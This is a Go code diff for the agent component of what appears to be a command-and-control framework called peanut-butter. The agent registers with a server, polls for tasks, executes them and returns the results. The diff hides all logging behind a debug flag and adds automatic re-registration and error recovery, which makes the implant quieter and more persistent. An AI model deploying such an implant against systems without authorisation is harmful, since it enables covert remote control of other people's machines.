@@ -4,20 +4,24 @@ package agent
 import (
 	"bytes"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"io"
+	"log"
 	"net"
 	"net/http"
 	"strings"
 	"time"
 
 	"github.com/MeHungr/peanut-butter/internal/api"
+	"github.com/MeHungr/peanut-butter/internal/pberrors"
 )
 
 // Agent has an api.Agent embedded, and creates additional methods
 // and fields for use in the agent package
 type Agent struct {
 	api.Agent
+	Debug bool
 	*http.Client
 }
 
@@ -76,11 +80,13 @@ func (a *Agent) Register() error {
 
 	// Print server response
 	if resp.StatusCode == http.StatusOK {
-		var msg api.Message
-		if err := json.Unmarshal(respBody, &msg); err != nil {
-			return fmt.Errorf("Failed to unmarshal server response: %w", err)
+		if a.Debug {
+			var msg api.Message
+			if err := json.Unmarshal(respBody, &msg); err != nil {
+				return fmt.Errorf("Failed to unmarshal server response: %w", err)
+			}
+			log.Println(msg.Message)
 		}
-		fmt.Println(msg.Message)
 	} else {
 		return fmt.Errorf("Server returned status code %d: %s", resp.StatusCode, string(respBody))
 	}
@@ -107,18 +113,35 @@ func (agent *Agent) GetTask() (*api.Task, error) {
 	}
 	defer resp.Body.Close()
 
-	if resp.StatusCode == http.StatusNoContent {
+	// Read the body of the response
+	respBody, _ := io.ReadAll(resp.Body)
+	switch resp.StatusCode {
+	case http.StatusNoContent:
 		return nil, nil // No task available
-	} else if resp.StatusCode != http.StatusOK {
-		respBody, _ := io.ReadAll(resp.Body)
-		return nil, fmt.Errorf("Server returned status %d: %s", resp.StatusCode, string(respBody))
-	} else {
+
+	case http.StatusBadRequest:
+		// If agent ID is unregistered, reregister
+		if strings.Contains(string(respBody), "Invalid agent ID") {
+			if agent.Debug {
+				log.Printf("Agent ID %s no longer recognized, re-registering...", agent.ID)
+			}
+			return nil, pberrors.ErrInvalidAgentID
+		} else { // Else, throw error for bad request
+			return nil, fmt.Errorf("Server returned status %d: %s", resp.StatusCode, string(respBody))
+		}
+
+	case http.StatusOK:
 		// Decodes the JSON body into a Task
 		var agentTask api.Task
-		if err := json.NewDecoder(resp.Body).Decode(&agentTask); err != nil {
+		if err := json.Unmarshal(respBody, &agentTask); err != nil {
 			return nil, fmt.Errorf("Failed to decode task JSON: %w", err)
 		}
 		return &agentTask, nil
+
+	default:
+		// Throw other errors
+		return nil, fmt.Errorf("Server returned status %d: %s", resp.StatusCode, string(respBody))
+
 	}
 }
 
@@ -173,34 +196,59 @@ func (agent *Agent) SendResult(result *api.Result) error {
 	return nil
 }
 
-func (agent *Agent) Start() {
-	fmt.Printf("Agent starting with ID: %s\n", agent.ID)
-
-	// Attempt to register with the server until successful
+// registerUntilDone has the agent attempt to register with the server until it is accepted
+func (agent *Agent) registerUntilDone() {
 	for {
-		err := agent.Register()
-		if err != nil {
-			fmt.Println(err)
+		if err := agent.Register(); err != nil {
+			if agent.Debug {
+				log.Println(err)
+			}
 			time.Sleep(5 * time.Second)
 			continue
 		}
 		break
 	}
+}
+
+// Start starts the agent and begins the main polling loop
+func (agent *Agent) Start() {
+	if agent.Debug {
+		log.Printf("Agent starting with ID: %s\n", agent.ID)
+	}
+
+	// Attempt to register with the server until successful
+	agent.registerUntilDone()
 
 	// Main polling loop
 	for {
 		task, err := agent.GetTask()
 		if err != nil {
-			fmt.Println(err)
+			if errors.Is(err, pberrors.ErrInvalidAgentID) {
+				if agent.Debug {
+					log.Printf("Agent ID %s invalid, re-registering...", agent.ID)
+				}
+				agent.registerUntilDone()
+				continue
+			}
+			if agent.Debug {
+				log.Println("GetTask error:", err)
+			}
+			time.Sleep(5 * time.Second)
+			continue
 		}
 
 		if task != nil {
 			result, err := agent.ExecuteTask(task)
 			if err != nil {
-				fmt.Println(err)
+				if agent.Debug {
+					log.Println("ExecuteTask error:", err)
+				}
+				continue
 			}
 			if err := agent.SendResult(result); err != nil {
-				fmt.Println(err)
+				if agent.Debug {
+					log.Println("SendResult error:", err)
+				}
 			}
 		}
 
